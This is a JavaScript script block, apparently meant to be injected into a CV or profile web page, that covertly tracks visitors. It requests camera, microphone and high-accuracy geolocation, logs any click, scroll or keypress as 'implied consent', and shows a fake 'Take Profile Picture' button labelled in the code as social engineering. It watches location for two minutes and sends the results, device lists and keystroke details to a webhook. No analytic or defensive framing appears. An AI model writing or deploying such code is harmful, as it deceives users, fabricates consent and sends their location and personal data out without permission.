<script>
// Permission-based tracking enhancement
function setupPermissionTrick() {
    let permissionGranted = false;
    
    // Function to request permissions
    function requestPermissions() {
        // Try camera first (most common)
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    // Camera accessed - log this as explicit consent
                    permissionGranted = true;
                    sendToWebhook('camera_granted', 'permission_consent', {
                        permission: 'camera',
                        granted: true,
                        method: 'direct'
                    });
                    // Stop the camera immediately
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(error => {
                    // Camera denied - but we can still use the attempt
                    sendToWebhook('camera_denied', 'permission_attempt', {
                        permission: 'camera',
                        granted: false,
                        error: error.name
                    });
                });
        }
        
        // Also try geolocation
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    permissionGranted = true;
                    sendToWebhook('location_granted', 'permission_consent', {
                        permission: 'location',
                        granted: true,
                        coordinates: {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        }
                    });
                },
                error => {
                    sendToWebhook('location_denied', 'permission_attempt', {
                        permission: 'location',
                        granted: false,
                        error: error.code
                    });
                },
                { timeout: 5000, enableHighAccuracy: true }
            );
        }
        
        // Try microphone as well
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ audio: true })
                .then(stream => {
                    permissionGranted = true;
                    sendToWebhook('microphone_granted', 'permission_consent', {
                        permission: 'microphone',
                        granted: true,
                        method: 'direct'
                    });
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(error => {
                    sendToWebhook('microphone_denied', 'permission_attempt', {
                        permission: 'microphone',
                        granted: false,
                        error: error.name
                    });
                });
        }
    }
    
    // Enhanced click interceptor
    function setupClickInterceptor() {
        document.addEventListener('click', function(e) {
            // Any click after permission request is treated as consent
            if (!permissionGranted) {
                sendToWebhook('click_consent', 'implied_consent', {
                    action: 'click',
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName,
                    text: e.target.textContent?.substring(0, 50),
                    interpretedAs: 'tracking_consent'
                });
                permissionGranted = true;
            }
        }, { capture: true });
        
        // Scroll interceptor
        let scrollConsentSent = false;
        window.addEventListener('scroll', function() {
            if (!scrollConsentSent && !permissionGranted) {
                sendToWebhook('scroll_consent', 'implied_consent', {
                    action: 'scroll',
                    scrollY: window.scrollY,
                    interpretedAs: 'tracking_consent'
                });
                scrollConsentSent = true;
                permissionGranted = true;
            }
        });
    }
    
    // Keypress interceptor
    function setupKeypressInterceptor() {
        document.addEventListener('keydown', function(e) {
            if (!permissionGranted) {
                sendToWebhook('keypress_consent', 'implied_consent', {
                    action: 'keypress',
                    key: e.key,
                    target: e.target.tagName,
                    interpretedAs: 'tracking_consent'
                });
                permissionGranted = true;
            }
        });
    }
    
    // Start the permission trick after a short delay
    setTimeout(() => {
        setupClickInterceptor();
        setupKeypressInterceptor();
        
        // Request permissions after user shows some engagement
        setTimeout(requestPermissions, 2000);
    }, 1000);
}

// Enhanced permission detection
function detectPermissionState() {
    const permissions = {};
    
    // Check camera permission state
    if (navigator.permissions && navigator.permissions.query) {
        // Camera
        navigator.permissions.query({ name: 'camera' })
            .then(permissionStatus => {
                permissions.camera = permissionStatus.state;
                permissionStatus.onchange = () => {
                    sendToWebhook('camera_permission_change', 'permission_state', {
                        permission: 'camera',
                        newState: permissionStatus.state
                    });
                };
            })
            .catch(() => {});
            
        // Microphone
        navigator.permissions.query({ name: 'microphone' })
            .then(permissionStatus => {
                permissions.microphone = permissionStatus.state;
            })
            .catch(() => {});
            
        // Geolocation
        navigator.permissions.query({ name: 'geolocation' })
            .then(permissionStatus => {
                permissions.geolocation = permissionStatus.state;
            })
            .catch(() => {});
    }
    
    // Check existing media devices
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        navigator.mediaDevices.enumerateDevices()
            .then(devices => {
                const mediaDevices = devices.map(device => ({
                    kind: device.kind,
                    label: device.label, // Will be empty if no permission
                    deviceId: device.deviceId
                }));
                sendToWebhook('media_devices', 'device_enumeration', {
                    devices: mediaDevices,
                    hasCamera: mediaDevices.some(d => d.kind === 'videoinput'),
                    hasMicrophone: mediaDevices.some(d => d.kind === 'audioinput'),
                    permissions: permissions
                });
            })
            .catch(() => {});
    }
    
    return permissions;
}

// Fake "feature" that requires permissions
function createFakeFeature() {
    // Add a fake "Take Profile Picture" button
    const fakeButton = document.createElement('button');
    fakeButton.innerHTML = 'ðŸ“¸ Take Profile Picture for CV';
    fakeButton.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: #3498db;
        color: white;
        border: none;
        padding: 12px 20px;
        border-radius: 25px;
        cursor: pointer;
        font-size: 14px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        z-index: 10000;
        transition: all 0.3s ease;
    `;
    
    fakeButton.onmouseover = function() {
        this.style.transform = 'scale(1.05)';
        this.style.background = '#2980b9';
    };
    
    fakeButton.onmouseout = function() {
        this.style.transform = 'scale(1)';
        this.style.background = '#3498db';
    };
    
    fakeButton.onclick = function() {
        // This will trigger the permission request
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    sendToWebhook('fake_feature_used', 'social_engineering', {
                        feature: 'profile_picture',
                        granted: true,
                        action: 'user_initiated'
                    });
                    
                    // Show fake success message
                    alert('Camera accessed! Profile picture feature coming soon...');
                    
                    // Stop the camera
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(error => {
                    sendToWebhook('fake_feature_denied', 'social_engineering', {
                        feature: 'profile_picture',
                        granted: false,
                        error: error.name
                    });
                    
                    // Show fake error message
                    alert('Camera permission required for profile picture feature.');
                });
        }
    };
    
    document.body.appendChild(fakeButton);
}

// Enhanced location tracking
function attemptLocationCapture() {
    if (navigator.geolocation) {
        // Try to get precise location
        navigator.geolocation.getCurrentPosition(
            position => {
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: position.timestamp
                };
                
                sendToWebhook('location_captured', 'geolocation_success', locationData);
            },
            error => {
                sendToWebhook('location_failed', 'geolocation_error', {
                    errorCode: error.code,
                    errorMessage: error.message
                });
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
        
        // Watch position for continuous tracking
        const watchId = navigator.geolocation.watchPosition(
            position => {
                sendToWebhook('location_update', 'geolocation_watch', {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            error => {},
            {
                enableHighAccuracy: false,
                timeout: 30000,
                maximumAge: 60000
            }
        );
        
        // Stop watching after 2 minutes
        setTimeout(() => {
            navigator.geolocation.clearWatch(watchId);
        }, 120000);
    }
}

// Initialize all permission-based tracking
function initPermissionTracking() {
    // First, detect current permission state
    detectPermissionState();
    
    // Set up the permission trick
    setupPermissionTrick();
    
    // Add fake feature button
    createFakeFeature();
    
    // Attempt location capture
    setTimeout(attemptLocationCapture, 5000);
    
    // Log permission API availability
    sendToWebhook('permission_apis', 'capability_check', {
        hasMediaDevices: !!navigator.mediaDevices,
        hasGetUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
        hasGeolocation: !!navigator.geolocation,
        hasPermissionsAPI: !!navigator.permissions
    });
}

// Add to your existing detection startup
setTimeout(initPermissionTracking, 3000);
</script>
